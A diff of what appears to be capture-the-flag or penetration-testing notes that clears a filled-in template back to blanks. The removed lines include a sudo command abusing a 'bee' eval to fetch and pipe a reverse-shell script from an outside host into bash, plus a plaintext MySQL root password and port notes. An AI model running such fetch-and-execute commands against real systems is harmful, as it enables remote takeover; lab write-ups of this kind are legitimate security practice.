@@ -17,7 +17,7 @@ dv.paragraph("```bash\n" + command + "\n```");
 Editing Box
 
 ```
-sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('curl 10.10.16.58:8000/rev.sh|bash;');"
+
 ```
 
 wget from local python server
@@ -33,11 +33,10 @@ dv.paragraph("```bash\n" + command + "\n```");
 
 ## Provided Credentials
 ---
-'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
 
-| Username | Password            | Notes |
-| -------- | ------------------- | ----- |
-| root     | BackDropJ2024DS2024 | mysql |
+| Username | Password | Notes |
+| -------- | -------- | ----- |
+|          |          |       |
 
 ---
 
@@ -47,8 +46,7 @@ dv.paragraph("```bash\n" + command + "\n```");
 
 | Port | Service | Notes |
 | ---- | ------- | ----- |
-| 22   | SSH     |       |
-| 80   | http    |       |
+|      |         |       |
 
 ---
 
